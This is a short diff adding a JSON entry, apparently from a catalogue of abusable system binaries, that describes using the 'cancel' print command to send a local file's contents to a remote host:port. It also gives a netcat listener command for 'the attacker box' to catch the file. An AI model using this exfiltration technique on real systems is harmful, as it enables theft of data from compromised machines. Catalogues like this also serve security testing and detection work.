@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "file-upload": [
+      {
+        "description": "Send local file using a TCP connection. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file.",
+        "code": "cancel -u \"$(cat [file])\" -h [host]:[port]\n"
+      }
+    ]
+  }
+}
